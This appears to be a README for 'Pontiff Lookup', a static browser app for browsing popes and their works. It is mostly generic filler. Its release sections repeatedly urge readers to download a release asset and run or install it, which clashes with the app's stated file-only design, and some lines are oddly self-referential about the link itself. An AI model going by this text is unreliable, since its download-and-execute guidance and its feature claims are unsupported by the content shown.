# Pontiff Lookup: Interactive Guide to Popes and Their Works

[![Release](https://img.shields.io/badge/Release-Latest-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Arandomised/pontiff-lookup/releases)

🕊️📜 A lightweight web app that helps you explore pontiffs and their notable works in an interactive, user friendly way. The project blends simple HTML, CSS, and JavaScript with JSON data to present a clean, browsable catalog. It runs in your browser, with no heavy backend required. This README explains what the project is, how to use it, how it’s built, and how you can contribute. For the latest release, you can visit the Releases page linked above.

Table of contents
- About Pontiff Lookup
- Core goals and design choices
- How the app works
- Features in depth
- Data model and data sources
- Getting started
- Running locally
- Customization and theming
- Extending with data and plugins
- Performance and accessibility
- Security and privacy
- Development and testing
- Localization and internationalization
- Documentation and examples
- Roadmap and future ideas
- Licensing and credits
- Contributing

About Pontiff Lookup
Pontiff Lookup is a simple, fast web application that introduces pontiffs and their significant works in an interactive and approachable way. The app is built around a lightweight, client-side architecture. It uses plain HTML, CSS, JavaScript, and jQuery for interactivity, paired with JSON data to represent pope biographies, reign periods, notable writings, and other key artifacts. The goal is to provide a calm, informative experience that invites exploration rather than overwhelm. The interface emphasizes clarity, readability, and quick access to contextual details. The project stays small on purpose, so you can host it yourself with minimal setup and tailor it to your needs.

Core goals and design choices
- Clarity over complexity: The user interface centers on legibility and straightforward navigation. Labels are explicit, actions are predictable, and the layout avoids clutter.
- Lightweight and self-hosted: The app is designed to run entirely in the browser. Data is bundled locally so users do not depend on a server to browse or search. This makes it easy to host on a personal server, a static site host, or a local file system.
- Fast and responsive: The UI updates swiftly as you type or change filters. Rendering is incremental, so you can start exploring before all data is processed.
- Flexible data model: The underlying data structure is simple enough to be extended without major changes. You can add new fields for works, notes, or cross references without breaking existing features.
- Accessibility by default: Keyboard navigation, semantic HTML, and sufficient color contrast ensure the app is usable by a wide audience.
- Open and shareable: The data and UI are designed to be shared as a single, portable package. You can copy the repository and run it anywhere you like.

How the app works
Pontiff Lookup reads a JSON data file that contains entries for pontiffs. Each entry holds a name, reign period, a short biography, and a list of significant works. The UI presents a searchable catalog on the left and a detail panel on the right. You can filter by reign dates, search by name or work title, and sort results by name or date. When you select a pope, a panel reveals biographical notes, key works, and references. The design emphasizes quick discovery and smooth transitions between views.

- Client-side rendering: The app runs in the browser. It does not require a server to function, though you can host it behind a web server if you prefer.
- JSON data: All pope data is stored in JSON format. This makes it easy to update, extend, or replace with alternative datasets.
- Interactions: Search as you type, filter by year range, click to expand details, and adjust the layout for readability. Keyboard shortcuts provide faster access for power users.
- Offline-friendly: Since the main content is stored locally, you can use Pontiff Lookup offline after the first load. This is ideal for self-hosted setups or presentations without a live internet connection.

Features in depth
- Quick search across names and works
  - Start typing to filter the list of pontiffs instantly.
  - The search engine is designed to catch partial matches and synonyms, aiding discovery.
  - Results update in real time with no page reloads.

- Flexible filtering
  - Narrow the catalog by reign period, almost like a timeline.
  - Filter by notable works or themes to focus on a specific topic.
  - Combine filters to drill down to a precise subset.

- Rich detail panels for each pope
  - A concise biography that covers the background, era, and significance.
  - A curated list of major works with year references and brief descriptions.
  - Links or citations to primary sources or scholarly references when available.

- Simple data format
  - Data is stored in JSON. The structure is straightforward and well documented in the repository.
  - Adding a pope or a work is a matter of appending to the JSON structure, with minimal changes to the UI code.

- Lightweight styling with accessibility
  - Clean typography and ample white space improve readability.
  - Color choices balance aesthetics with accessibility needs.
  - All interactive elements have visible focus styles to aid keyboard users.

- Self-hosted by design
  - No server-side logic is required to run the app.
  - You can host it from a static file server, a file system, or a CDN.
  - The code is simple enough for beginners to understand and rebuild.

- Offline readiness
  - After the initial load, the UI can be used without an active internet connection.
  - If you bundle a data file with your build, the entire catalog stays accessible offline.

- Extensible data model
  - Extend the data with fields such as birth, death, city of origin, coat of arms references, or scholarly notes.
  - Add new categories for works, such as major writings, decrees, or confessional rules, without breaking existing features.

Data model and data sources
The app centers around two core ideas: a compact data model and a reliable data source. Each pope entry includes a unique identifier, name, reign dates (start and end year), a short biography, and an array of works. Each work object contains a title, year, a short description, and optional notes or references. The JSON format is easy to read and edit, which makes it straightforward to update the dataset as new scholarship becomes available or as you want to tailor the catalog for a specific audience.

Data example (conceptual)
{
  "popes": [
    {
      "id": "pope-xx",
      "name": "Pope [Name]",
      "reign": {"start": 1500, "end": 1521},
      "bio": "Brief biography highlighting the era and key contributions.",
      "works": [
        {
          "title": "Major Work A",
          "year": 1502,
          "description": "Short description of the work and its significance.",
          "notes": "Cross references, citations, or English translation notes."
        }
      ],
      "notes": "Additional notes or cross references."
    }
  ]
}

If you want to customize the data, you can replace or augment popes.json with your own dataset. The UI remains the same, and the display adapts to new fields.

Getting started
- What you need
  - A modern web browser with JavaScript enabled.
  - A copy of the Pontiff Lookup repository. The app is designed to run without a back-end, so you can host it with any static hosting solution or open it directly from your file system for local testing.

- Quick start for local testing
  - Clone the repository to your machine.
  - Open index.html in your browser.
  - Explore the catalog, try different searches, and adjust filters.

- Quick start with a local server (recommended for development)
  - If you have Python installed:
    - Run: python3 -m http.server 8000
    - Open http://localhost:8000 in your browser.
  - If you have Node.js installed:
    - Install a simple static server such as http-server.
    - Run: npx http-server -p 8000
    - Open http://localhost:8000.
  - If you want a more integrated workflow, you can set up a simple npm script to serve the static content.

- Accessing the data
  - The data is bundled inside the app folder, typically under a data or assets directory. You can edit popes.json to update the catalog, add new entries, or revise existing ones. After you save changes, refresh the page to see updates.

- Release assets
  - If you want to use the official release assets, you should fetch the latest release from the Releases page. The release file is hosted at the provided link, which has a path component and therefore represents a downloadable asset. You can download the file and run it, depending on the packaging. For the official download location, see the link below.

Releases and download guidance
- The official release page is linked in this document. The exact location is the Releases page:
  https://github.com/Arandomised/pontiff-lookup/releases
  This link contains a path, so the page typically hosts release assets. To use a release, locate the asset you need on that page, download it, and execute the installer or runner as described in the asset's documentation. If you encounter issues with the link or the asset, you can always check the Releases section for alternatives or updated assets.

- Why the releases page matters
  - It provides the latest packaged version of the app, including any compiled bundles, assets, or installers that accompany a release. The release page helps you verify checksums, choose the correct artifact for your environment, and see release notes that explain what changed. If the main page is unavailable, the Releases section often remains accessible and offers a stable path to obtain the necessary files. For more details, revisit the Releases page.

- Dual-purpose link usage
  - The link to the releases page is used twice in this README. The first usage is at the top as part of the badge linking to the Releases page. The second usage appears here in the context of guidance for obtaining the packaged release. This ensures you have quick access to both the overview and the downloadable artifacts.

Customization and theming
- Styling and layout
  - The default styling aims for readability and a calm aesthetic. If you want to customize the look, you can modify the CSS files or adopt a new theme. The CSS selectors are straightforward, and you can adjust fonts, spacing, and color schemes without affecting the core logic.
  - For color themes, consider light and dark variants to improve readability in different lighting conditions. You can expose a theme toggle with a simple JavaScript switch that swaps CSS variables.

- Internationalization
  - The app is ready to support multiple languages. You can add language files in JSON format and wire them into the UI text. The search and filtering logic remains unchanged; the translations only affect labels, prompts, and help text. If you want to add a language, create a new locale file and wire it into the initialization code.

- Extending the data
  - Add new fields to pope entries as needed. If you add a field like “originCity” or “coatOfArms,” you can display it in the detail panel with minimal changes. The data model is designed to be forgiving and progressive; missing fields simply render as absent, without breaking the UI.
  - You can also append additional works or notes to each pope. The works array supports arbitrary length and can be expanded as new scholarship emerges.

- Custom assets
  - You can replace imagery with your own assets. If you store images locally, update the image paths in the data or the UI code to reference your assets. The app is built to handle asset references cleanly, so swapping out visuals preserves behavior.

Extending with data and plugins
- Data augmentation
  - If you want more content, you can source public-domain or open-licensed texts and include summaries or translations as part of works. The app supports long-form notes and cross references to help users explore related topics.
  - You can add cross-link fields that connect a pope to related figures, places, or events. This makes the experience more interconnected while keeping the UI simple.

- Plugins and enhancements
  - The architecture is modular enough to accept small plugins. For example, you might add a plugin to visualize timelines, provide alternative views, or import data from external JSON sources.
  - A plugin can register new filters, introduce a compact recap panel, or integrate a mini glossary of terms. The core API provides straightforward hooks for adding features without rewriting the UI.

Performance and accessibility
- Performance considerations
  - The app uses a minimal DOM footprint and leverages efficient rendering patterns. Even with a larger dataset, the UI remains responsive because updates are scoped to the relevant sections.
  - If you add a lot of data, consider lazy loading for images or deferring non-critical rendering until after the initial paint. You can also implement a pagination or virtualized list approach for very large catalogs.

- Accessibility considerations
  - All interactive elements are keyboard accessible. Focus indicators are visible, and the color contrast is chosen to be readable for most users.
  - Semantic HTML helps screen readers interpret the content. ARIA labels provide additional context for complex widgets while keeping the default HTML structure simple.
  - If you add new components, keep accessibility in mind. Ensure that roles, labels, and descriptions convey clear purpose.

Security and privacy
- Client-side data
  - Everything runs in the browser. The data file is included with the site; no server-side data collection is required. This makes the app easy to host privately without tracking users.
- Trust and integrity
  - If you fetch data from external sources, verify the source and consider signing data to prevent tampering. For a fully offline experience, use a bundled JSON data file and a controlled asset set.
- Dependency hygiene
  - The core stack uses standard web technologies. If you introduce third-party libraries, keep them updated and audit them for security vulnerabilities.

Development and testing
- Project structure
  - The repository follows a simple layout: HTML, CSS, and JavaScript files sit alongside a data directory containing popes.json. Assets are kept separate to simplify editing and sharing.
- Local development workflow
  - To test changes quickly, edit the data or UI files and refresh the page. For more robust testing, set up a local server as described in Getting started.
- Testing strategies
  - Manual testing: Try different search queries, filters, and selections. Verify that the detail panel displays correct information and that sorting behaves as expected.
  - Regression checks: After data updates, ensure that existing features still work. Confirm that the UI remains coherent with both small and larger data sets.
  - Optional automated tests: If you expand the app with JavaScript modules, you may add unit tests for the data parsing and filtering logic. A lightweight test setup with a small test runner can cover essential behaviors.

Localization and internationalization notes
- Language files
  - Store translations in separate JSON files. Each language file maps UI strings to translated values. The app should load the appropriate file at startup, with a default fallback.
- Date and number formats
  - Handle dates and numeric values in a locale-aware manner when displaying reign years or counts of works. A simple approach is to present years as four-digit numbers and avoid locale-specific date formatting complications for now.
- Right-to-left and script considerations
  - If you add languages that use right-to-left scripts, adjust the layout to respect the writing direction. Test alignment and reading order to ensure readability in all supported languages.

Documentation and examples
- In-repo docs
  - The repository includes inline comments and a basic API-like explanation for how the data is structured. You will also find notes about how to extend the dataset and how to adapt the UI to new fields.
- Examples and templates
  - If you want to demonstrate the app in a talk or workshop, you can create a sample dataset with a subset of pope entries. A small, focused example helps learners understand how the data maps to the UI.
- Exporting data
  - You can export a subset of data by writing a script that filters the JSON data. This is useful for creating tailored demos, teaching materials, or themed collections.

Roadmap and future ideas
- Timeline visualization
  - Add an interactive timeline to complement the list view, allowing users to drag a cursor across reign periods to filter the catalog by date range.
- Cross-reference explorer
  - Create a panel that highlights connections between popes, works, and regions. This would help users see patterns in the data and discover related topics quickly.
- Data enrichment
  - Integrate external open datasets to enrich entries with more context, such as major events during reigns or references to related religious orders.
- User-generated content
  - Allow users to propose edits or add their own entries through a moderated interface. This can help keep the catalog up-to-date while maintaining data quality.

Licensing and credits
- Licensing
  - The project is released under a permissive license to encourage reuse and adaptation. You may use and modify the code, provided you preserve attribution and comply with the license terms.
- Credits
  - Acknowledge the sources of data and any contributors who helped refine the UI, data, or documentation. Credit is important for transparency and collaboration.

Contributing
- How to contribute
  - Fork the repository, create a branch for your feature or fix, and submit a pull request. Be sure to include a clear description of what you changed and why.
  - Start with small, focused changes to make it easier to review. If you want to propose a larger redesign, discuss it in an issue first to align with the project’s goals.
- Code quality and style
  - Keep functions small and focused. Use descriptive names and add comments where necessary to explain non-obvious choices.
  - Ensure new features are accessible and do not negatively impact performance.
- Issue reporting
  - When reporting issues, include steps to reproduce, expected behavior, actual behavior, and any relevant environment details. Attach screenshots or screen recordings if it helps illustrate the problem.

End-user guidance: a quick tour
- Start on the main catalog
  - The left panel lists pontiffs. You can scroll, search, and filter to focus on a subset of entries.
- Use the search bar to find a pope or a particular work by title
  - Type a name like “Gregory” or a work like “Decretals” to see matching results.
- Select a pope to view details
  - The right panel expands to show a short bio, notable works, and cross-references.
- Refine the view with filters
  - Narrow by reign dates or by a theme. The UI updates immediately as you adjust settings.
- Save or share your view
  - If you have cloned the repository, you can share a URL fragment that encodes your current filters. This helps others reproduce your view without manual steps.

Releases, again
- Accessing the downloadable package
  - The release page linked at the top provides packaged assets for convenient distribution. The exact artifact you choose will depend on your environment and preferences. If you encounter any issues with the link or downloading assets, revisit the Releases section for alternatives or updated files.
- Verifying integrity
  - If the release provides checksums, verify the checksum before using the artifact. This helps ensure the file has not been corrupted in transit.
- Post-download steps
  - After downloading, follow the asset-specific instructions to install or run the package. If the asset is a static bundle, you may simply open the index.html file in a browser. If the asset is a packaged app, follow the installer prompts to complete the setup.

Final notes
- This README describes Pontiff Lookup as a lightweight, self-hosted web app designed for exploration and education. The data and UI are kept intentionally simple to promote understanding and customization. You can host it on a personal server, a static hosting service, or run it locally for demonstrations or classroom use. The project welcomes improvements and new ideas from the community. The release page linked at the top remains the primary source for official builds and updates, and the same URL is referenced again here to ensure you have a direct path to the latest package and release notes.

License
- This project is released under a permissive license. See the LICENSE file in the repository for full terms and conditions.

Credits
- The project credits the contributors and data sources that helped shape the design and content. If you adapt the project, consider crediting the original author and any individuals who contributed substantial improvements.

Thank you for exploring Pontiff Lookup. May your journey through the papal lineage be clear, thoughtful, and enlightening.